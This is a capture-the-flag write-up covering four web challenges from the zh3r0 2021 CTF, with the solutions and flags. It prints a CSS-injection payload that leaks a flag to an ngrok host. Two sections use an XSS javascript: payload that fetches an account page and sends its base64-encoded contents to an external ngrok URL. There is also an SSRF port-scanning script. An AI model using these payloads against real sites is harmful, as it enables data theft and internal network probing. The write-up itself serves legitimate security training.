# Web challenge write-ups

Combining these web challenges into one document since I don't feel like
making  
detailed write-ups.

## Flags

**Category**: web \  
**Solves**: 20 \  
**Points**: 871 \  
**Author**: navy

Here is a website where each user gets a flag. However, only the admin has the  
correct flag. Can you guess it?

Mirror 1 - http://web.zh3r0.cf:4444 \  
Mirror 2 - http://web.zh3r0.cf:4321 \  
Download - [Flags.tar.gz](Flags.tar.gz)

### Solution

> Solved with @anirudhb, who did most of the work

```ejs  
       <meta http-equiv='Content-Security-Policy' content="script-src 'nonce-<%=bytes%>'; object-src 'none'; base-uri 'none'require-trusted-types-for 'script'; frame-src 'none'">  
...  
       <div class="flagDisplay">  

Your flag is

  
           <%- flagProfile %>  
       </div>  
       <div class="form">  
           <form action="/check" method="post">  
               <fieldset>  
                   <legend>Check if your flag matches the admin's</legend>  
                   <div class="flag">  
                       <input type="flag" name="flag" value="<%= flag %>">  
                   </div>  
                       <button type="submit" name="submit" value="submit">Check</button>  
               </fieldset>  
           </form>  
```

We have reflected HTML in `flagProfile`. Our goal is to exfiltrate the admins  
flag from

```ejs  
<input type="flag" name="flag" value="<%= flag %>">.  
```

Script execution is blocked by CSP, but we can inject CSS to leak characters  
one by one:  
```html  
<style>  
.flag { display: block !important; }  
input[value^="zh3r0{a"] { background-image:
url(http://d92615501434.ngrok.io/a); }  
input[value^="zh3r0{b"] { background-image:
url(http://d92615501434.ngrok.io/b); }  
input[value^="zh3r0{c"] { background-image:
url(http://d92615501434.ngrok.io/c); }  
...  
input[value^="zh3r0{8"] { background-image:
url(http://d92615501434.ngrok.io/8); }  
input[value^="zh3r0{9"] { background-image:
url(http://d92615501434.ngrok.io/9); }  
input[value^="zh3r0{_"] { background-image:
url(http://d92615501434.ngrok.io/_); }  
input[value^="zh3r0{{"] { background-image:
url(http://d92615501434.ngrok.io/%7B); }  
input[value^="zh3r0{}"] { background-image:
url(http://d92615501434.ngrok.io/%7D); }  
</style>  
```

Unfortunately the challenge organizers really messed up the infra on this one.  
I would constantly be logged out for no reason, making it annoying to test the  
exploit. Also why did they have to make the flag so long?  
```  
zh3r0{this_is_a_flag_02b0482ec93d9f5688d5e0562fc2e2db}  
```

Solve script in `flags_solve.py`

## Original Store

**Category**: web \  
**Solves**: 22 \  
**Points**: 842 \  
**Author**: DreyAnd

Hi! Check out our car dealership platform - the Original Store at  
[Store](http://35.200.166.215:5555/). We also have a contest running right now  
and who has the best car wins! You can send us your car's images at  
[bot](http://35.200.166.215:5556/).

## Solution

Sourceless XSS challenge. After some 20 min of guessing I found an unintended
solution

```  
javascript:fetch('/account.php').then((r)=>r.text()).then((r)=>window.location.href='http://abca940c718f.ngrok.io/'+window.btoa(r))  
```

```  
zh3r0{4dm1n_l0ves_0nly_0r1g1n4ls_br0}  
```

For reference,  
[Carmen San
Diego](https://gist.github.com/bluepichu/6898d0f15f9b58ba5a0571213c3896a2)  
from [PlaidCTF 2021](https://ctftime.org/event/1199) had the same unintended  
solution.

> Author's intended solution: https://dreyand.github.io/zh3r0-ctfv2/original-
> store/

## Original Store v2

**Category**: web \  
**Solves**: 20 \  
**Points**: 871 \  
**Author**: DreyAnd

## Overview

Exactly the same as the previous one, except now the cookie is `HttpOnly:  
true`. Fortunately(?) this doesn't fix the unintended solution:

## Solution

```  
javascript:fetch('/account.php').then((r)=>r.text()).then((r)=>window.location.href='http://abca940c718f.ngrok.io/'+window.btoa(r))  
```

```  
zh3r0{4dm1n_h4tes_car_st34l3rs_br0}  
```

## Baby SSRF

**Category**: web \  
**Solves**: 40 \  
**Points**: 453 \  
**Author**: ZyperX

Yet another server challenge :)

Link - http://web.zh3r0.cf:6969

## Solution

> Solved with @anirudhb

Weird challenge with no source provided. There's a page where you can request
a  
URL and get the headers returned. For some reason `localhost` is blocked, but  
that's easily bypassed using `http://localtest.me` or a 302 redirect.

We guessed that we had to scan ports on `localhost` and the flag would  
magically appear in the header.

Unfortunately, my connection is super slow so I just rented a VPS in India  
which scanned 5000 ports in under a minute:

```python  
import requests  
import sys

chall_url = "http://web.zh3r0.cf:6969"  
redir_url = "http://localtest.me"

def check_port(port: int):  
   data = {"url": f"{redir_url}/{port}"}  
   res = requests.post(f"{chall_url}/request", data)  
   return res.text

start = int(sys.argv[1])  
end = int(sys.argv[2])

for port in range(start, end):  
   print(f"[*] Checking port {port}")  
   html = check_port(port)  
   if "Learn about URL" not in html:  
       print(f"[+] Found something on {port}")  
       print(f"[*] HTML: {html}")  
       open(f"port_{port}.txt", "w").write(html)  
```

Turns out the port was 9006.

```  
zh3r0{SSRF_0r_wh4t3v3r_ch4ll3ng3}  
```  

Original writeup
(https://github.com/qxxxb/ctf/tree/master/2021/zh3r0_ctf/web#flags).